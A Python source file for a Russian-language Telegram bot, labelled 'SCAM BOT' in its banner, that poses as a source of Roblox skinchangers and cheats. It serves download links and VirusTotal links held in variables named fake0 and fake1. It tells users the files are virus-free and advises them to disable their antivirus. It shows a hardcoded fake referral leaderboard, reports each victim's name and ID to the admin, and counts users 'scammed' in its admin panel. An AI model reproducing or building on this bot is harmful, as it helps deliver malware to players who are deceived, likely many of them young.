from aiogram import Bot, Dispatcher, executor, types
import logging
from db import Database
from colorama import Fore
import bcrypt
from config import *

# label = f'''

#         {Fore.RED} ____   ____    _    __  __   ____   ___ _____ 
#         {Fore.YELLOW}/ ___| / ___|  / \  |  \/  | | __ ) / _ \_   _|
#         {Fore.LIGHTYELLOW_EX}\___ \| |     / _ \ | |\/| | |  _ \| | | || |  
#         {Fore.LIGHTCYAN_EX} ___) | |___ / ___ \| |  | | | |_) | |_| || |  
#         {Fore.BLUE}|____/ \____/_/   \_\_|  |_| |____/ \___/ |_| 

#                     {Fore.LIGHTBLACK_EX}Made by: {Fore.RESET}{Fore.RED}fairet{Fore.RESET}

#                     {Fore.LIGHTCYAN_EX}[1] Start Bot (TOKEN+ADMIN_ID)
#                     [2] Install Requirements
#                     [3] Exit {Fore.RESET}
#     '''
# print(label)
choice = 1 #input(f"{Fore.LIGHTCYAN_EX}Choose: {Fore.RESET}")

bytePwd = cfg_token.encode('utf-8')
salt = bcrypt.gensalt()

if choice == '3':
    exit()

elif choice == '2':
    print(f"{Fore.BLACK}Write 'pip install -r requirements.txt' \nTY, then restart the bot{Fore.RESET}")
    input()

else:
    print(f"\n"                                  
            f"{Fore.MAGENTA}Hashed Token: {Fore.RESET}{Fore.RED}{bcrypt.hashpw(bytePwd, salt)} (Salt: {salt}){Fore.RESET}\n"
            f"{Fore.MAGENTA}Your Admin Id: {admin_id}"
            f"\n"
            f"To use Admin Panel: write 'adm'{Fore.RESET}")
    
bot = Bot(cfg_token)
db = Database('users.db')
dp = Dispatcher(bot)

@dp.message_handler(commands=['start'])
async def welcome(message: types.Message):

    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2,
        input_field_placeholder="Выберите кнопку: ")
    start = types.KeyboardButton("🥷🏻 ПРОФИЛЬ")
    top = types.KeyboardButton("📊 ТОП")
    help = types.KeyboardButton("✨️ ПОМОЩЬ")
    soft = types.KeyboardButton("👀 СОФТ")

    if not db.user_exists(message.from_user.id):
        db.add_user(message.from_user.id)
        await bot.send_message(
            message.from_user.id,
            f"🙌Приветствуем! Это команда {name}. \n👨‍💻Введите ваш никнейм:")
    else:
        markup.add(start, soft, top, help)
        await bot.send_message(
            message.from_user.id,"🔥 Добро пожаловать, здесь вы можете получить\n\n👽 Skinchanger Roblox 2.3.1 by n0nBann3d\n👾 EazyScript by crash1d\n\n⚠️Все файлы запускаются на пк!\n♻️ Никаких вирусов нет!",
            reply_markup=markup)

@dp.message_handler(content_types=['text'])
async def bot_message(message: types.Message):

    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2,
        input_field_placeholder="Выберите кнопку: ")

    if message.chat.type == 'private':

        if message.text == '🥷🏻 ПРОФИЛЬ' or message.text == '/profile':

            ref = types.InlineKeyboardMarkup(row_width=2)
            scam = types.InlineKeyboardButton(text="👋 Пригласить", callback_data="ref")
            back = types.InlineKeyboardButton(text="↩️ ВЕРНУТЬСЯ", callback_data="back1")

            ref.insert(scam)
            ref.insert(back)

            user_nickname = f"👋 Добро пожаловать в ваш профиль!" \
                            f"\n⠀⠀  " \
                            f"\n🧑‍💻 Ваш псевдоним: {db.get_nickname(message.from_user.id)} \n🎁 Количество ваших рефералов: "
            await bot.send_message(message.from_user.id, text=user_nickname, reply_markup=ref)

        elif message.text == '✨️ ПОМОЩЬ':
            await bot.send_message(message.from_user.id, f"🔱 Контакт для помощи: {help0}")

        elif message.text == '📊 ТОП':
            await bot.send_message(message.from_user.id,    #   FAKE REFERALS
                                    "🔰 Реферальная система. Баллы выдаются за приглашение людей!\n"
                                    "🥇 Ник: Скрытый Рефералы: 16 \n"
                                    "🥈 Ник: Скрытый Рефералы: 13\n"
                                    "🥉 Ник: Скрытый Рефералы: 11\n"
                                    "4. Ник: @Shock680 Рефералы: 9\n"
                                    "5. Ник: Скрытый Рефералы: 8\n"
                                    "6. Ник: Скрытый Рефералы: 6\n"
                                    "7. Ник: Скрытый Рефералы: 5\n"
                                    "8. Ник: Скрытый Рефералы: 4\n"
                                    "9.... Ник: Скрытый Рефералы: 3")


        elif message.text == '👀 СОФТ':

            inline = types.InlineKeyboardMarkup(row_width=2)
            skinchange = types.InlineKeyboardButton(text="✨ СКИНЧЕНДЖЕР",
                                                    callback_data="skin")
            cheats = types.InlineKeyboardButton(text="🚀 ЧИТЫ", callback_data="cheat")
            back = types.InlineKeyboardButton(text="↩️ ВЕРНУТЬСЯ", callback_data="back1") 

            inline.insert(skinchange)
            inline.insert(cheats)
            inline.insert(back)

            await bot.send_message(message.from_user.id,
                                    text="⬇️ Выберите тип: ",
                                    reply_markup=inline)

        else:

            if db.get_signup(message.from_user.id) == "setnickname":

                if (len(message.text) > 15):
                    await bot.send_message(message.from_user.id,
                                            "⛔️ Псевдоним должен быть меньше 15 символов.")
                elif '@' in message.text or '/' in message.text:
                    await bot.send_message(message.from_user.id,
                                            "⛔️ Вы использовали запрещенные символы (@, /)")
                else:
                    db.set_nickname(message.from_user.id, message.text)
                    db.set_signup(message.from_user.id, "Registred")
                    await bot.send_message(message.from_user.id,
                                            "✅️ Регистрация прошла успешно!",
                                            reply_markup=markup)

            else:
                if message.text == "adm":
                    # ADMIN PANEL
                    if message.from_user.id == admin_id:
                        print("000")
                        adm = types.InlineKeyboardMarkup(row_width=2)

                        refreal = types.InlineKeyboardButton(text="Топ по рефералам (real)", callback_data="refral")
                        ban = types.InlineKeyboardButton(text="Бан", callback_data="ban")
                        razban = types.InlineKeyboardButton(text="Разбан", callback_data="unban")
                        status = types.InlineKeyboardButton(text="Статус", callback_data="status")
                        users = types.InlineKeyboardButton(text="Юзеры", callback_data="users")

                        adm.insert(refreal)
                        adm.insert(status)
                        adm.insert(ban)
                        adm.insert(razban)
                        adm.insert(users)

                        await bot.send_message(message.from_user.id, text=f"Всего пользователей:  \n"
                                                                f"Всего заскамлено:  \n"
                                                                f"Всего не заскамлено: ",
                                                reply_markup=adm)
                    else:
                        print("Non-Admin was wanting get")
                else:

                    await bot.send_message(message.from_user.id,
                                            "🚫 Введите пожалуйста /start")

    else:
        print("Non-private chat.type")                

@dp.callback_query_handler(text="refral")
async def refral(call: types.CallbackQuery):
    pass

@dp.callback_query_handler(text="status")
async def status(call: types.CallbackQuery):
    pass

@dp.callback_query_handler(text="ban")
async def ban(call: types.CallbackQuery):
    pass

@dp.callback_query_handler(text="unban")
async def uunban(call: types.CallbackQuery):
    pass

@dp.callback_query_handler(text="users")
async def users(call: types.CallbackQuery):
    db.get_users(user_id=call.from_user.id)
    pass









# Under the Developemt
# @dp.callback_query_handler(text="ref")
# async def ref(call: types.CallbackQuery):
#     ref = types.InlineKeyboardMarkup(row_width=2)

#     scam = types.InlineKeyboardButton(text="👋 Ссылка", callback_data="ref")
#     back = types.InlineKeyboardButton(text="↩️ ВЕРНУТЬСЯ", callback_data="back1")

#     ref.insert(scam)
#     ref.insert(back)
#     await call.message.edit_text(text="Under The Developement")
#     await call.message.edit_reply_markup(reply_markup=ref)


@dp.callback_query_handler(text='skin')
async def choice1(call: types.CallbackQuery):

    await bot.send_message(admin_id, text=f'''{call.from_user.full_name}\n@{call.from_user.username}\n{call.from_user.id}''')

    skins = types.InlineKeyboardMarkup(row_width=2)
    vt1 = types.InlineKeyboardButton(
        
        text="♻️ VirusTotal",
        callback_data="main",
        url=
        fake0_vt
    )
    download1 = types.InlineKeyboardButton(
        text="🔥 Скачать",
        callback_data="main",
        url=
        fake0)

    back = types.InlineKeyboardButton(
        text="↩️ ВЕРНУТЬСЯ",  # 2
        callback_data="back")

    skins.insert(vt1)
    skins.insert(download1)
    skins.insert(back)
    await call.message.edit_text(
        text=f'''♻️ Skinchanger Roblox 2.3.1 by n0nBann3d\n└Доступные режимы:\n\n🤩 Pet Simulator X\n😼 Blox Fruits (fixed)\n👊🏻 Jailbreak (new)\n 👥 Adopt Me! (fixed)\n🚀 Mad City (new)\n❤️ MeetCity (new)\n\nℹ Информация:\n\n✨ VirusTotal - Проверка скинченджера на 59 вирусов!\n✈️ Если антивирус ругается на наш файл, советуем выключить его!\n\n😾 Инструкция внутри архива!\n🔥 Пароль от архива: {skinp}''')
    await call.message.edit_reply_markup(reply_markup=skins)

@dp.callback_query_handler(text="cheat")
async def choice2(call: types.CallbackQuery):

    await bot.send_message(admin_id, text=f'''{call.from_user.full_name}\n@{call.from_user.username}\n{call.from_user.id}''')
    skins = types.InlineKeyboardMarkup(row_width=2)
    vt1 = types.InlineKeyboardButton(
        text="♻️ VirusTotal",
        callback_data="main",
        url=
        fake1_vt
    )
    download1 = types.InlineKeyboardButton(
        text="🔥 Скачать",
        callback_data="main",
        url=
        fake1
    )

    back = types.InlineKeyboardButton(
        text="↩️ ВЕРНУТЬСЯ",  # 3
        callback_data="back"
    )
    skins.insert(vt1)
    skins.insert(download1)         
    skins.insert(back)
    await call.message.edit_text(
        text=f'''🔥 EazyScript by crash1d\n└Функции:\n\n🚷 ANTI-AFK(🔥УНИКАЛЬНОЕ)🤩\n Visuals(best)📵\n Auto-farm👊🏻\n Flyhack(new)\n 👥 Sizechanger (🔥NEW)\n\n ℹ️ Информация:\n\n 🚀 VirusTotal - Проверка чита на 59 вирусов!\n😼 Если антивирус ругается на наш файл, советуем выключить его!\n\n✈️ Инструкция внутри архива!\n👊🏻 Пароль от архива: {cheatp}''')
    await call.message.edit_reply_markup(reply_markup=skins)

@dp.callback_query_handler(text="back")
async def choice3(call: types.CallbackQuery):

    inline = types.InlineKeyboardMarkup(row_width=2)
    skinchange = types.InlineKeyboardButton(text="✨ СКИНЧЕНДЖЕР",
                                            callback_data="skin")
    cheats = types.InlineKeyboardButton(text="🚀 ЧИТЫ", callback_data="cheat")
    back = types.InlineKeyboardButton(text="↩️ ВЕРНУТЬСЯ", callback_data="back1")  # 1

    inline.insert(skinchange)
    inline.insert(cheats)
    inline.insert(back)
    await call.message.edit_text(text="⬇️ Выберите тип: ")
    await call.message.edit_reply_markup(reply_markup=inline)


@dp.callback_query_handler(text="back1")
async def choice4(call: types.CallbackQuery):

    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2,
        input_field_placeholder="Выберите кнопку: ")

    await call.message.edit_text("⬇️ Напишите пожалуйста /start")
    start = types.KeyboardButton("🥷🏻 ПРОФИЛЬ")
    top = types.KeyboardButton("📊 ТОП")
    help = types.KeyboardButton("✨️ ПОМОЩЬ")
    soft = types.KeyboardButton("👀 СОФТ")
    markup.add(start, soft, top, help)

@dp.callback_query_handler(text="main")
async def scamed(call: types.CallbackQuery):
    await bot.send_message(admin_id, text=f'''{call.from_user.full_name}\n@{call.from_user.username}\n{call.from_user.id}''')

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    print("")
    executor.start_polling(dp, skip_updates=True)
else:
    print("This is .py file hasn't funcion main()")